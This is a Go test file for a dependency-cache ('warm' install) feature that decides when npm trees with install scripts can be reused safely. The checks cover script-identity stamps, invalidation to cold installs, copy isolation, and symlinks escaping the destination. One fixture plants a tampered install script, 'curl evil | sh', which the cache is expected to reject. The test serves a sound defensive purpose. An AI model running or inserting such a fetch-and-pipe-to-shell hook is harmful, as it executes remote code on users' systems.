package warm

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

const (
	trustedRootManifest = `{"name":"fixture","scripts":{"postinstall":"node setup.js","build":"node build.js"}}`
	trustedLock         = `{"lockfileVersion":3,"packages":{"":{"name":"fixture"},"node_modules/native-dep":{"version":"1.0.0","integrity":"sha512-fixture","hasInstallScript":true}}}`
	trustedDepManifest  = `{"name":"native-dep","version":"1.0.0","scripts":{"install":"node-gyp rebuild","test":"ignored"}}`
)

// Root lifecycle scripts are only trusted with a rebuild that reproduces them.
var trust = Policy{TrustInstallScripts: true, Rebuild: "npm rebuild && npm run postinstall"}

func digestText(s string) string {
	sum := sha256.Sum256([]byte(s))
	return hex.EncodeToString(sum[:])
}

func writeTrustedInputs(t *testing.T, root, manifest, lock string) {
	t.Helper()
	require.NoError(t, os.WriteFile(filepath.Join(root, "package.json"), []byte(manifest), 0644))
	require.NoError(t, os.WriteFile(filepath.Join(root, "package-lock.json"), []byte(lock), 0644))
}

// installNative simulates `npm ci` of a dependency with an install script
// that built a native addon.
func installNative(t *testing.T, root, depManifest string) {
	t.Helper()
	dep := filepath.Join(root, "node_modules", "native-dep")
	require.NoError(t, os.MkdirAll(filepath.Join(dep, "build", "Release"), 0755))
	require.NoError(t, os.WriteFile(filepath.Join(dep, "package.json"), []byte(depManifest), 0644))
	require.NoError(t, os.WriteFile(filepath.Join(dep, "build", "Release", "addon.node"), []byte("\x7fELF native addon"), 0755))
}

func trustedFixture(t *testing.T, policy Policy) (string, *Install) {
	t.Helper()
	root := t.TempDir()
	writeTrustedInputs(t, root, trustedRootManifest, trustedLock)
	i, err := prepareWithPolicy(root, "node_modules", "toolchain", []string{"ci"}, policy)
	require.NoError(t, err)
	require.NotNil(t, i)
	installNative(t, root, trustedDepManifest)
	require.NoError(t, i.Record())
	return root, i
}

func trustedTarget(t *testing.T, source string, policy Policy) *Install {
	t.Helper()
	root := t.TempDir()
	for _, name := range []string{"package.json", "package-lock.json"} {
		b, err := os.ReadFile(filepath.Join(source, name))
		require.NoError(t, err)
		require.NoError(t, os.WriteFile(filepath.Join(root, name), b, 0644))
	}
	i, err := prepareWithPolicy(root, "node_modules", "toolchain", []string{"ci"}, policy)
	require.NoError(t, err)
	require.NotNil(t, i)
	return i
}

// fakeClone makes the "cloned" result deterministic on filesystems without
// reflink support while still producing an independent copy.
func fakeClone(source, dest string, mode os.FileMode, copyMode string) (string, error) {
	return copyWithClone(source, dest, mode, copyMode, func(a, b string) error {
		data, err := os.ReadFile(a)
		if err != nil {
			return err
		}
		f, err := os.OpenFile(b, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0600)
		if err != nil {
			return err
		}
		_, err = f.Write(data)
		if closeErr := f.Close(); err == nil {
			err = closeErr
		}
		return err
	})
}

func requireNoTree(t *testing.T, root string) {
	t.Helper()
	_, err := os.Lstat(filepath.Join(root, "node_modules"))
	require.True(t, os.IsNotExist(err), "no destination dependency tree expected: %v", err)
}

func TestTrustedNativeAddonWarmReportsCloned(t *testing.T) {
	src, _ := trustedFixture(t, trust)
	stored, err := readStamp(src, "node_modules")
	require.NoError(t, err)
	require.NotEmpty(t, stored.Inputs)
	require.True(t, stored.TrustInstallScripts)
	require.Equal(t, []ScriptIdentity{
		{Package: "", Script: "postinstall", SHA256: digestText("node setup.js")},
		{Package: "node_modules/native-dep", Script: "install", SHA256: digestText("node-gyp rebuild")},
	}, stored.TrustedScripts)
	require.Equal(t, []string{"node_modules/native-dep"}, stored.InstallScriptPackages)
	require.Empty(t, stored.Source, "a cold install has no warm source")

	for range 2 {
		i := trustedTarget(t, src, trust)
		result, err := i.reuse(src, "auto", fakeClone)
		require.NoError(t, err)
		require.Equal(t, "cloned", result)
		data, err := os.ReadFile(filepath.Join(i.root, "node_modules", "native-dep", "build", "Release", "addon.node"))
		require.NoError(t, err)
		require.Equal(t, "\x7fELF native addon", string(data))
		require.NoError(t, i.Record())
		record, err := readStamp(i.root, "node_modules")
		require.NoError(t, err)
		require.NotEmpty(t, record.Tree)
		require.Equal(t, src, record.Source)
		require.Equal(t, stored.TrustedScripts, record.TrustedScripts)
	}
}

func TestTrustedWarmInvalidationsGoCold(t *testing.T) {
	for _, change := range []string{"lockfile", "toolchain", "root script", "dependency script", "stamped script identity", "rebuild command", "opt-in removed"} {
		t.Run(change, func(t *testing.T) {
			src, _ := trustedFixture(t, trust)
			policy := trust
			if change == "rebuild command" {
				policy.Rebuild = "npm rebuild"
			}
			if change == "opt-in removed" {
				// Install scripts make the default policy refuse outright.
				prepared, err := prepareWithPolicy(t.TempDir(), "node_modules", "toolchain", []string{"ci"}, Policy{})
				require.NoError(t, err)
				require.Nil(t, prepared)
				return
			}
			i := trustedTarget(t, src, policy)
			switch change {
			case "lockfile":
				writeTrustedInputs(t, i.root, trustedRootManifest, `{"lockfileVersion":3,"packages":{"":{"name":"fixture"},"node_modules/native-dep":{"version":"1.0.1","integrity":"sha512-other","hasInstallScript":true}}}`)
			case "toolchain":
				// Node/npm versions, platform and architecture all feed the
				// probed toolchain fingerprint.
				i.toolchain = "node-23-darwin-arm64"
			case "root script":
				writeTrustedInputs(t, i.root, `{"name":"fixture","scripts":{"postinstall":"node other.js","build":"node build.js"}}`, trustedLock)
			case "dependency script":
				require.NoError(t, os.WriteFile(filepath.Join(src, "node_modules", "native-dep", "package.json"), []byte(`{"name":"native-dep","version":"1.0.0","scripts":{"install":"curl evil | sh"}}`), 0644))
			case "stamped script identity":
				stored, err := readStamp(src, "node_modules")
				require.NoError(t, err)
				stored.TrustedScripts[1].SHA256 = digestText("something else")
				require.NoError(t, writeStamp(src, "node_modules", stored))
			}
			if change == "lockfile" || change == "root script" {
				var err error
				i, err = prepareWithPolicy(i.root, "node_modules", "toolchain", []string{"ci"}, policy)
				require.NoError(t, err)
				require.NotNil(t, i)
			}
			result, err := i.reuse(src, "auto", fakeClone)
			require.NoError(t, err)
			require.Equal(t, Cold, result)
			requireNoTree(t, i.root)
		})
	}
}

func TestTrustOptInRemovedForScriptlessNativeAddonGoesCold(t *testing.T) {
	src := t.TempDir()
	writeTrustedInputs(t, src, `{"name":"fixture"}`, `{"lockfileVersion":3,"packages":{"":{"name":"fixture"},"node_modules/native-dep":{"version":"1.0.0","integrity":"sha512-fixture"}}}`)
	i, err := prepareWithPolicy(src, "node_modules", "toolchain", []string{"ci"}, trust)
	require.NoError(t, err)
	installNative(t, src, `{"name":"native-dep","version":"1.0.0"}`)
	require.NoError(t, i.Record())
	stored, err := readStamp(src, "node_modules")
	require.NoError(t, err)
	require.NotEmpty(t, stored.Inputs)

	target := trustedTarget(t, src, Policy{})
	result, err := target.reuse(src, "auto", fakeClone)
	require.NoError(t, err)
	require.Equal(t, Cold, result)
	requireNoTree(t, target.root)
}

func TestDefaultPolicyStillColdForInstallScriptsAndNativeAddons(t *testing.T) {
	root := t.TempDir()
	writeTrustedInputs(t, root, `{"name":"fixture"}`, trustedLock)
	i, err := prepareWithPolicy(root, "node_modules", "toolchain", []string{"ci"}, Policy{})
	require.NoError(t, err)
	require.Nil(t, i, "lockfile hasInstallScript stays cold by default")

	src := t.TempDir()
	writeTrustedInputs(t, src, `{"name":"fixture"}`, `{"lockfileVersion":3,"packages":{"":{"name":"fixture"},"node_modules/native-dep":{"version":"1.0.0","integrity":"sha512-fixture"}}}`)
	i, err = prepareWithPolicy(src, "node_modules", "toolchain", []string{"ci"}, Policy{})
	require.NoError(t, err)
	require.NotNil(t, i)
	installNative(t, src, `{"name":"native-dep","version":"1.0.0"}`)
	require.NoError(t, i.Record())
	stored, err := readStamp(src, "node_modules")
	require.NoError(t, err)
	require.Empty(t, stored.Inputs, "native addons are never stamped by default")
	result, err := trustedTarget(t, src, Policy{}).reuse(src, "auto", fakeClone)
	require.NoError(t, err)
	require.Equal(t, Cold, result)
}

func TestTrustedLockfileScriptMetadataMustMatchInstalledTree(t *testing.T) {
	for name, lock := range map[string]string{
		"installed script not flagged": `{"lockfileVersion":3,"packages":{"":{"name":"fixture"},"node_modules/native-dep":{"version":"1.0.0","integrity":"sha512-fixture"}}}`,
		"flagged package has none":     trustedLock,
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			writeTrustedInputs(t, root, trustedRootManifest, lock)
			i, err := prepareWithPolicy(root, "node_modules", "toolchain", []string{"ci"}, trust)
			require.NoError(t, err)
			require.NotNil(t, i)
			dep := trustedDepManifest
			if name == "flagged package has none" {
				dep = `{"name":"native-dep","version":"1.0.0"}`
			}
			installNative(t, root, dep)
			require.NoError(t, i.Record())
			stored, err := readStamp(root, "node_modules")
			require.NoError(t, err)
			require.Empty(t, stored.Inputs)
		})
	}
}

func TestTrustedImplicitNodeGypInstallIsAnIdentity(t *testing.T) {
	root := t.TempDir()
	writeTrustedInputs(t, root, `{"name":"fixture"}`, trustedLock)
	i, err := prepareWithPolicy(root, "node_modules", "toolchain", []string{"ci"}, trust)
	require.NoError(t, err)
	installNative(t, root, `{"name":"native-dep","version":"1.0.0"}`)
	require.NoError(t, os.WriteFile(filepath.Join(root, "node_modules", "native-dep", "binding.gyp"), []byte("{}"), 0644))
	require.NoError(t, i.Record())
	stored, err := readStamp(root, "node_modules")
	require.NoError(t, err)
	require.NotEmpty(t, stored.Inputs)
	require.Equal(t, []ScriptIdentity{{Package: "node_modules/native-dep", Script: "install", SHA256: digestText("node-gyp rebuild")}}, stored.TrustedScripts)
}

func TestTrustedSourcePathRequiresRebuildAndDetachedDestination(t *testing.T) {
	for _, rebuild := range []string{"", "npm rebuild"} {
		t.Run("rebuild="+rebuild, func(t *testing.T) {
			policy := Policy{TrustInstallScripts: true, Rebuild: rebuild}
			src := t.TempDir()
			writeTrustedInputs(t, src, `{"name":"fixture"}`, trustedLock)
			i, err := prepareWithPolicy(src, "node_modules", "toolchain", []string{"ci"}, policy)
			require.NoError(t, err)
			installNative(t, src, trustedDepManifest)
			gypi := filepath.Join("node_modules", "native-dep", "build", "config.gypi")
			require.NoError(t, os.WriteFile(filepath.Join(src, gypi), []byte(`{"nodedir":"`+src+`/node_modules/.cache"}`), 0644))
			require.NoError(t, i.Record())
			stored, err := readStamp(src, "node_modules")
			require.NoError(t, err)
			target := trustedTarget(t, src, policy)
			result, err := target.reuse(src, "copy", copyFile)
			require.NoError(t, err)
			if rebuild == "" {
				require.Empty(t, stored.Inputs, "workspace paths without a rebuild stay cold")
				require.Equal(t, Cold, result)
				return
			}
			require.NotEmpty(t, stored.Inputs)
			require.Equal(t, "copied", result)
			require.Equal(t, rebuild, target.Rebuild())
			require.Error(t, target.CheckDetached(), "copied tree still references the source")
			require.NoError(t, os.WriteFile(filepath.Join(target.root, gypi), []byte(`{"nodedir":"`+target.root+`/node_modules/.cache"}`), 0644))
			require.NoError(t, target.CheckDetached())
			require.NoError(t, target.Discard())
			requireNoTree(t, target.root)
			record, err := readStamp(target.root, "node_modules")
			require.NoError(t, err)
			require.Empty(t, record.Inputs)
		})
	}
}

func TestCheckDetachedIgnoresSiblingPathsWithSharedPrefix(t *testing.T) {
	for text, references := range map[string]bool{
		"/wt/feature":          true,
		"/wt/feature/build":    true,
		`"/wt/feature"`:        true,
		"/wt/feature-2/build":  false,
		"/wt/featureX":         false,
		"/wt/feature2/x":       false,
		"/wt/feature-2 /wt/fe": false,
		"file:///wt/feature/x": true,
		"//wt/feature/x":       true,
		"/mnt/wt/feature/x":    false,
		"x=/wt/feature:":       true,
		strings.Repeat("a ", 40000) + "/wt/feature/x":  true,
		strings.Repeat("a ", 32767) + "a/wt/feature-2": false,
		strings.Repeat("b", 65535) + " /wt/feature":    true,
	} {
		found, err := referencesPath(strings.NewReader(text), "/wt/feature")
		require.NoError(t, err)
		require.Equal(t, references, found, text[max(0, len(text)-40):])
	}
}

func TestTrustedWarmIsolation(t *testing.T) {
	for _, copier := range []struct {
		name string
		mode string
		fn   fileCopier
	}{{"copy", "copy", copyFile}, {"clone", "auto", fakeClone}, {"native", "auto", copyFile}} {
		t.Run(copier.name, func(t *testing.T) {
			src, _ := trustedFixture(t, trust)
			i := trustedTarget(t, src, trust)
			result, err := i.reuse(src, copier.mode, copier.fn)
			require.NoError(t, err)
			require.NotEqual(t, Cold, result)
			addon := filepath.Join("node_modules", "native-dep", "build", "Release", "addon.node")
			for _, rel := range []string{addon, filepath.Join("node_modules", "native-dep", "package.json")} {
				srcInfo, err := os.Lstat(filepath.Join(src, rel))
				require.NoError(t, err)
				dstInfo, err := os.Lstat(filepath.Join(i.root, rel))
				require.NoError(t, err)
				require.True(t, dstInfo.Mode().IsRegular(), "no symlinks into the source")
				require.False(t, os.SameFile(srcInfo, dstInfo), "no hardlinks into the source")
			}
			require.NoError(t, os.WriteFile(filepath.Join(i.root, addon), []byte("destination rebuilt"), 0755))
			data, err := os.ReadFile(filepath.Join(src, addon))
			require.NoError(t, err)
			require.Equal(t, "\x7fELF native addon", string(data))
			require.NoError(t, os.WriteFile(filepath.Join(src, addon), []byte("source rebuilt"), 0755))
			data, err = os.ReadFile(filepath.Join(i.root, addon))
			require.NoError(t, err)
			require.Equal(t, "destination rebuilt", string(data))
		})
	}
}

func TestTrustedRootLifecycleScriptsRequireRebuild(t *testing.T) {
	for name, tc := range map[string]struct {
		manifest string
		policy   Policy
		eligible bool
	}{
		"root postinstall without rebuild": {trustedRootManifest, Policy{TrustInstallScripts: true}, false},
		"root prepare without rebuild":     {`{"name":"fixture","scripts":{"prepare":"node codegen.js"}}`, Policy{TrustInstallScripts: true}, false},
		"root postinstall with rebuild":    {trustedRootManifest, trust, true},
		"dependency scripts only":          {`{"name":"fixture","scripts":{"build":"node build.js"}}`, Policy{TrustInstallScripts: true}, true},
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			writeTrustedInputs(t, root, tc.manifest, trustedLock)
			i, err := prepareWithPolicy(root, "node_modules", "toolchain", []string{"ci"}, tc.policy)
			require.NoError(t, err)
			require.Equal(t, tc.eligible, i != nil)
		})
	}
}

func TestTrustedGypfileFalseHasNoImplicitInstall(t *testing.T) {
	root := t.TempDir()
	writeTrustedInputs(t, root, `{"name":"fixture"}`, `{"lockfileVersion":3,"packages":{"":{"name":"fixture"},"node_modules/native-dep":{"version":"1.0.0","integrity":"sha512-fixture"}}}`)
	i, err := prepareWithPolicy(root, "node_modules", "toolchain", []string{"ci"}, trust)
	require.NoError(t, err)
	installNative(t, root, `{"name":"native-dep","version":"1.0.0","gypfile":false}`)
	require.NoError(t, os.WriteFile(filepath.Join(root, "node_modules", "native-dep", "binding.gyp"), []byte("{}"), 0644))
	require.NoError(t, i.Record())
	stored, err := readStamp(root, "node_modules")
	require.NoError(t, err)
	require.NotEmpty(t, stored.Inputs, "gypfile:false means no implicit install, matching the lockfile")
	require.Empty(t, stored.TrustedScripts)
}

func warmedWithRebuild(t *testing.T) (string, *Install) {
	t.Helper()
	src, _ := trustedFixture(t, trust)
	target := trustedTarget(t, src, trust)
	result, err := target.reuse(src, "copy", copyFile)
	require.NoError(t, err)
	require.Equal(t, "copied", result)
	require.NoError(t, target.CheckDetached())
	return src, target
}

func TestCheckDetachedRejectsSymlinksLeavingDestination(t *testing.T) {
	for name, link := range map[string]func(src, dest string) string{
		"absolute into source": func(src, _ string) string { return filepath.Join(src, "node_modules", "native-dep") },
		"absolute inside dest": func(_, dest string) string { return filepath.Join(dest, "node_modules", "native-dep") },
		"relative escaping":    func(string, string) string { return "../../../outside" },
		"relative into source": func(src, dest string) string {
			r, err := filepath.Rel(filepath.Join(dest, "node_modules", ".bin"), filepath.Join(src, "node_modules"))
			require.NoError(t, err)
			return r
		},
	} {
		t.Run(name, func(t *testing.T) {
			src, target := warmedWithRebuild(t)
			bin := filepath.Join(target.root, "node_modules", ".bin")
			require.NoError(t, os.MkdirAll(bin, 0755))
			if err := os.Symlink(link(src, target.root), filepath.Join(bin, "evil")); err != nil {
				t.Skipf("symlinks unavailable: %v", err)
			}
			require.Error(t, target.CheckDetached())
		})
	}
	t.Run("relative inside dest", func(t *testing.T) {
		_, target := warmedWithRebuild(t)
		bin := filepath.Join(target.root, "node_modules", ".bin")
		require.NoError(t, os.MkdirAll(bin, 0755))
		if err := os.Symlink("../native-dep/package.json", filepath.Join(bin, "ok")); err != nil {
			t.Skipf("symlinks unavailable: %v", err)
		}
		require.NoError(t, target.CheckDetached())
	})
}

func TestCheckDetachedSourceAliases(t *testing.T) {
	for _, tc := range []struct{ source, text string }{
		{"/private/var/wt/feature", "/var/wt/feature/build"},
		{"/var/wt/feature", "/private/var/wt/feature/build"},
		{"/wt/my feature", `/wt/my\ feature/build`},
	} {
		found := false
		for _, needle := range detachNeedles(tc.source) {
			hit, err := referencesPath(strings.NewReader(tc.text), needle)
			require.NoError(t, err)
			found = found || hit
		}
		require.True(t, found, "%s should reference %s", tc.text, tc.source)
	}
}

func TestRecordWarmFailsWhenTreeNoLongerCertifiable(t *testing.T) {
	_, target := warmedWithRebuild(t)
	require.NoError(t, os.WriteFile(filepath.Join(target.root, "node_modules", ".env"), []byte("SECRET=1"), 0644))
	require.Error(t, target.RecordWarm())
	stored, err := readStamp(target.root, "node_modules")
	require.NoError(t, err)
	require.Empty(t, stored.Inputs)
}
